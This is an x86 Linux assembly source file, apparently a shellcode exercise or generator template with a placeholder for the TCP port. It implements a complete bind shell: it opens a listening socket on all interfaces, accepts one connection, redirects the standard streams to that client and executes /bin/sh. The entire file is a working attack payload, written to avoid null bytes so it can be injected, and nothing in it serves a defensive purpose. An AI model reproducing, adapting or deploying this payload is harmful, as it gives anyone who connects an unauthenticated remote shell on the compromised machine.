; Author: Robert C. Raducioiu (rbct)

global _start

section .text

_start:

    ; SYSCALLS for Linux x86:
    ; /usr/include/i386-linux-gnu/asm/unistd_32.h
    ; or https://web.archive.org/web/20160214193152/http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html

    ; sys_socketcall
    xor eax, eax
    mov ebx, eax
    mov ecx, eax
    mov al, 102

    ; SYS_SOCKET
    mov bl, 1

    ; IPPROTO_TCP
    mov cl, 6
    push ecx

    ; SOCK_STREAM (0x00000001)
    push ebx

    ; AF_INET
    mov cl, 2
    push ecx

    ; Pointer to the arguments for SYS_SOCKET call
    mov ecx, esp

    ; call syscall
    int 0x80

    ; INADDR_ANY (0x00000000)
    dec ebx
    push ebx
    
    ; TCP port in big endian
    {{ TEMPLATE_TCP_PORT }}

    ; 0x0002 -> AF_INET
    mov bl, 2
    push WORD bx

    ; save the pointer to the struct for later
    mov ecx, esp
    
    ; 3rd argument of bind(): size of the struct
    ; push 16
    rol bl, 3
    push ebx

    ; 2nd argument of bind(): pointer to the struct
    push ecx

    ; 1st argument of bind(): file descriptor of the server socket
    mov esi, eax
    push eax
    
    ; syscall socketcall
    xor eax, eax
    mov al, 102

    ; 1st argument of socketcall(): call SYS_BIND
    ror bl, 3

    ; 2nd argument of socketcall(): pointer to the parameters of bind()
    mov ecx, esp

    int 0x80

    ; 2nd argument of listen(): set backlog (connection queue size) to 1
    mov bl, 1
    push 1

    ; 1st argument of listen(): file descriptor of the server socket
    push esi
    
    ; syscall socketcall
    mov eax, ebx
    mov al, 102

    ; 1st argument of socketcall(): SYS_LISTEN call
    ; mov ebx, 4
    rol bl, 2

    ; 2nd argument of socketcall(): pointer to listen() arguments
    mov ecx, esp

    ; execute listen()
    int 0x80

    ; 3rd argument of accept(): size of client_address struct
    rol bl, 2
    push ebx

    ; 2nd argument of accept: client_address struct, in this case empty
    xor ebx, ebx
    push ebx
    push ebx

    ; 1st argument of accept: file descriptor of the server socket
    push esi

    ; syscall socketcall
    ; mov eax, 102
    mov eax, ebx
    mov al, 102

    ; 1st argument of socketcall(): SYS_ACCEPT call
    mov bl, 5

    ; 2nd argument of socketcall(): pointer to accept() arguments
    mov ecx, esp

    ; execute accept()
    int 0x80

    ; loop counter (repeats dup2() three times)
    ; mov ecx, 3
    mov ecx, ebx
    mov bl, 3

    ; save Client File Descriptor for later use
    mov edi, eax

RepeatDuplicate:
    ; save ecx since it's modified later
    push ecx

    ; dup2() syscall
    ; mov eax, 63
    mov al, 63

    ; Client file descriptor
    mov ebx, edi

    ; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor
    mov ecx, DWORD [esp]
    dec ecx

    ; call dup2()
    int 0x80

    ; restore ecx and check if loop is over
    pop ecx
    loop RepeatDuplicate

SpawnShell:

    push ecx
    mov ecx, esp
    mov edx, esp

    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    xor eax, eax
    mov al, 11

    int 0x80
